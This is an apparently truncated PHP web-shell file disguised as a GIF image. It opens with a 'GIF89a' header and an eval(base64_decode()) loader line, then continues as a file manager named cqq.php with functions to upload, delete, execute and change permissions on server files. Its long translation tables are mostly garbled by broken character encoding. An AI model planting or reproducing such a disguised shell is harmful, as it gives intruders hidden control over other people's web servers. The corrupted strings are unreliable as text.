GIF89a??<?php /**/eval(base64_decode('')); ?>
<?php
$lang = 'auto';
$site_charset = 'auto';
$homedir = './';
...
function listing_page ($message = null) {
	...
	echo '<h1 style="margin-bottom: 0">cqq.php</h1>
...
'really_delete' => 'Sollen folgende Dateien wirklich gel?آ¶scht werden?',
'deleted' => "Folgende Dateien wurden gel?آ¶scht:\n[%1]",
'not_deleted' => "Folgende Dateien konnten nicht gel?آ¶scht werden:\n[%1]",
...
'not_readable' => '"[%1]" kann nicht gelesen werden.'
	...
	case 'fr':
		...
		return array(
'directory' => 'R?آ©pertoire',
'file' => 'Fichier',
'filename' => 'Nom fichier',

'size' => 'Taille',
'permission' => 'Droits',
'owner' => 'Propri?آ©taire',
'group' => 'Groupe',
'other' => 'Autres',
'functions' => 'Fonctions',
...
'create_symlink' => 'Cr?آ©er lien symbolique',
'delete' => 'Effacer',
'rename' => 'Renommer',
'move' => 'D?آ©placer',
'copy' => 'Copier',
'edit' => 'Ouvrir',
'download' => 'T?آ©l?آ©charger sur PC',
'upload' => 'T?آ©l?آ©charger sur serveur',
'create' => 'Cr?آ©er',
'change' => 'Changer',
'save' => 'Sauvegarder',
'set' => 'Ex?آ©cuter',
'reset' => 'R?آ©initialiser',
'relative' => 'Relatif',
...
'uploaded' => '"[%1]" a ?آ©t?آ© t?آ©l?آ©charg?آ© sur le serveur.',
'not_uploaded' => '"[%1]" n a pas ?آ©t?آ© t?آ©l?آ©charg?آ© sur le serveur.',
'already_exists' => '"[%1]" existe d?آ©j? .',
'created' => '"[%1]" a ?آ©t?آ© cr?آ©?آ©.',
'not_created' => '"[%1]" n a pas pu ??tre cr?آ©?آ©.',
'really_delete' => 'Effacer le fichier?',
'deleted' => "Ces fichiers ont ?آ©t?آ© d?آ©tuits:\n[%1]",
'not_deleted' => "Ces fichiers n ont pu ??tre d?آ©truits:\n[%1]",
'rename_file' => 'Renomme fichier:',
'renamed' => '"[%1]" a ?آ©t?آ© renomm?آ© en "[%2]".',
'not_renamed' => '"[%1] n a pas pu ??tre renomm?آ© en "[%2]".',
'move_files' => 'D?آ©placer ces fichiers:',
'moved' => "Ces fichiers ont ?آ©t?آ© d?آ©plac?آ©s en \"[%2]\":\n[%1]",
'not_moved' => "Ces fichiers n ont pas pu ??tre d?آ©plac?آ©s en \"[%2]\":\n[%1]",
'copy_files' => 'Copier ces fichiers:',
'copied' => "Ces fichiers ont ?آ©t?آ© copi?آ©s en \"[%2]\":\n[%1]",
'not_copied' => "Ces fichiers n ont pas pu ??tre copi?آ©s en \"[%2]\":\n[%1]",
'not_edited' => '"[%1]" ne peut ??tre ouvert.',
'executed' => "\"[%1]\" a ?آ©t?آ© brillamment ex?آ©cut?آ© :\n{%2}",
'not_executed' => "\"[%1]\" n a pas pu ??tre ex?آ©cut?آ©:\n{%2}",
'saved' => '"[%1]" a ?آ©t?آ© sauvegard?آ©.',
'not_saved' => '"[%1]" n a pas pu ??tre sauvegard?آ©.',
'symlinked' => 'Un lien symbolique depuis "[%2]" vers "[%1]" a ?آ©t?آ© cr?آ©e.',
'not_symlinked' => 'Un lien symbolique depuis "[%2]" vers "[%1]" n a pas pu ??tre cr?آ©?آ©.',
'permission_for' => 'Droits de "[%1]":',
'permission_set' => 'Droits de "[%1]" ont ?آ©t?آ© chang?آ©s en [%2].',
'permission_not_set' => 'Droits de "[%1]" n ont pas pu ??tre chang?آ©s en[%2].',
...
'not_edited' => '"[%1]" kan inte ?آ¤ndras.',
'executed' => "\"[%1]\" har utf?آ¶rts:\n{%2}",
'not_executed' => "\"[%1]\" kunde inte utf?آ¶ras:\n{%2}",
'saved' => '"[%1]" har sparats.',
...
'permission_for' => 'R?آ¤ttigheter f?آ¶r "[%1]":',
'permission_set' => 'R?آ¤ttigheter f?آ¶r "[%1]" ?آ¤ndrades till [%2].',
'permission_not_set' => 'Permission of "[%1]" could not be set to [%2].',
'not_readable' => '"[%1]" kan inte l?آ¤sas.'
		);
...
'not_readable' => '"[%1]" no pudo ser le?آ­do.'
		);
...
'permission_not_set' => 'Rettigheder for "[%1]" kunne ikke s?آ¦ttes til [%2].',
'not_readable' => '"[%1]" Kan ikke l?آ¦ses.'
		);
...
'executed' => "\"[%1]\" basariyla ?آ§alistirildi:\n{%2}",
'not_executed' => "\"[%1]\" ?آ§alistirilamadi:\n{%2}",
'saved' => '"[%1]" kaydedildi.',
...
'read' => '?â€??â€™ten???آ­',
'write' => 'Z????pis',
'execute' => 'Spou?â€¦??t?â€????n???آ­',

'create_symlink' => 'Vytvo?â€¦?â€??it symbolick???? odkaz',
'delete' => 'Smazat',
'rename' => 'P?â€¦?â€??ejmenovat',
'move' => 'P?â€¦?â€??esunout',
'copy' => 'Zkop???آ­rovat',
'edit' => 'Otev?â€¦?â€?????آ­t',
'download' => 'St????hnout',
...
'password' => 'Heslo',
'add' => 'P?â€¦?â€??idat',
'add_basic_auth' => 'p?â€¦?â€??idej z????kladn???آ­ autentizaci',

'uploaded' => 'Soubor "[%1]" byl nahr????n na server.',
'not_uploaded' => 'Soubor "[%1]" nebyl nahr????n na server.',
'already_exists' => 'Soubor "[%1]" u?â€¦?? exituje.',
'created' => 'Soubor "[%1]" byl vytvo?â€¦?â€??en.',
'not_created' => 'Soubor "[%1]" nemohl b????t  vytvo?â€¦?â€??en.',
'really_delete' => 'Vymazat soubor?',
'deleted' => "Byly vymaz????ny tyto soubory:\n[%1]",
'not_deleted' => "Tyto soubory nemohly b????t vytvo?â€¦?â€??eny:\n[%1]",
'rename_file' => 'P?â€¦?â€??ejmenuj soubory:',
'renamed' => 'Soubor "[%1]" byl p?â€¦?â€??ejmenov????n na "[%2]".',
'not_renamed' => 'Soubor "[%1]" nemohl b????t p?â€¦?â€??ejmenov????n na "[%2]".',
'move_files' => 'P?â€¦?â€??em???آ­stit tyto soubory:',
'moved' => "Tyto soubory byly p?â€¦?â€??em???آ­st?â€????ny do \"[%2]\":\n[%1]",
'not_moved' => "Tyto soubory nemohly b????t p?â€¦?â€??em???آ­st?â€????ny do \"[%2]\":\n[%1]",
'copy_files' => 'Zkop???آ­rovat tyto soubory:',
'copied' => "Tyto soubory byly zkop???آ­rov????ny do \"[%2]\":\n[%1]",
'not_copied' => "Tyto soubory nemohly b????t zkop???آ­rov????ny do \"[%2]\":\n[%1]",
'not_edited' => 'Soubor "[%1]" nemohl b????t otev?â€¦?â€??en.',
'executed' => "SOubor \"[%1]\" byl spu?â€¦??t?â€????n :\n{%2}",
'not_executed' => "Soubor \"[%1]\" nemohl b????t spu?â€¦??t?â€????n:\n{%2}",
'saved' => 'Soubor "[%1]" byl ulo?â€¦??en.',
'not_saved' => 'Soubor "[%1]" nemohl b????t ulo?â€¦??en.',
'symlinked' => 'Byl vyvo?â€¦?â€??en symbolick???? odkaz "[%2]" na soubor "[%1]".',
'not_symlinked' => 'Symbolick???? odkaz "[%2]" na soubor "[%1]" nemohl b????t vytvo?â€¦?â€??en.',
'permission_for' => 'Pr????va k "[%1]":',
'permission_set' => 'Pr????va k "[%1]" byla zm?â€????n?â€????na na [%2].',
'permission_not_set' => 'Pr????va k "[%1]" nemohla b????t zm?â€????n?â€????na na [%2].',
'not_readable' => 'Soubor "[%1]" nen???آ­ mo?â€¦??no p?â€¦?â€??e?â€??????آ­st.'
		);
...
'group' => '?آ§?â€™?â€¢??????',
'other' => '?آ¤?â€™?â€¢?â€،?â€°?â€¦',
'functions' => '?آ¦?â€¢???â€¹???â€°?â€ک',

'read' => '???â€°?â€????â€???',
'write' => '???â€°?â€œ???â€???',
'execute' => '?â€”?â„¢?????????â€°?â€???',

'create_symlink' => '???â€??â€¦?????â€??? ?â€œ?â€°?????â€°???â€¹',
'delete' => '?â€¢?â€??????â€°?â€???',
'rename' => '???â€¦?â€™?â€¦?â€°???â€¦?????â€”???â€???',
'move' => '???â€¦?â€™?â€¦?â€??â€”?â€°???â€¢?â€???',
'copy' => '?â€¹?????â€°?â€™???â€”???â€???',
...
'save' => '?â€œ???â‚¬?â€™?????â€°?â€???',
'set' => '?â€¢?â€œ?â€????????â€”?â€°?â€???',
'reset' => '?â€œ?â€ڑ?â€™???â€œ?â€°?â€???',
'relative' => '???â€??????â€œ?â€°?â€??â€¦???????â„¢?? ???â€¢?â€??? ?â€¹ ???â€¦???â€°',

'yes' => '?â€???',
'no' => '???â€¦?â€?',
'back' => '?????????â€?',
'destination' => '???â€¦????',
'symlink' => '?â€œ?â€°???â€”?????â€°???â€¦?â€œ?â€¹?â€°?? ???â€°???â€¹',
'no_output' => '???â€¦?â€? ?â€”?â„¢?â€”???â€???',

'user' => '?آ°???????????â€”???â€??â€¦????',
'password' => '?آ°???â€™??????',
'add' => '?â€????â€ڑ???â€”?â€°?â€???',
'add_basic_auth' => '?آ¤???â€ڑ???â€”?â€°?â€??? HTTP-Basic-Auth',

'uploaded' => '"[%1]" ?â€ڑ?â„¢?? ?????â€¹?????â€¦??.',
'not_uploaded' => '"[%1]" ???â€¦?â€”?????????â€“???? ?â€ڑ?â„¢???? ?????â€¹?????â€ک?â€???.',
'already_exists' => '"[%1]" ?â€¢?â€“?â€¦ ?â€œ?â€¢???â€¦?â€œ?â€??â€”?â€¢?â€¦?â€?.',
'created' => '"[%1]" ?â€ڑ?â„¢?? ?â€œ?â€??â€¦??????.',
'not_created' => '"[%1]" ???â€¦ ?â€”?????????â€“???? ?â€œ?â€??â€¦?????â€???.',
'really_delete' => '?آ¤?â€¦???â€œ?â€??â€”?â€°?â€??â€¦???????? ???â€????â€? ?â€ ?????? ?â€¢?â€??????â€°?â€????',
'deleted' => "?????â€¦?â€??â€¢?????â€°?â€¦ ?â€ ???????â„¢ ?â€ڑ?â„¢???â€° ?â€¢?â€??????â€¦???â„¢:\n[%1]",
'not_deleted' => "?????â€¦?â€??â€¢?????â€°?â€¦ ?â€ ???????â„¢ ???â€¦ ?â€”?????????â€“???? ?â€ڑ?â„¢???? ?â€¢?â€??????â€°?â€???:\n[%1]",
'rename_file' => '?آ°?â€¦?â€™?â€¦?â€°???â€¦?????â€”?â„¢?â€”???? ?â€ ??????:',
'renamed' => '"[%1]" ?â€ڑ?â„¢?? ???â€¦?â€™?â€¦?â€°???â€¦?????â€”???? ???? "[%2]".',
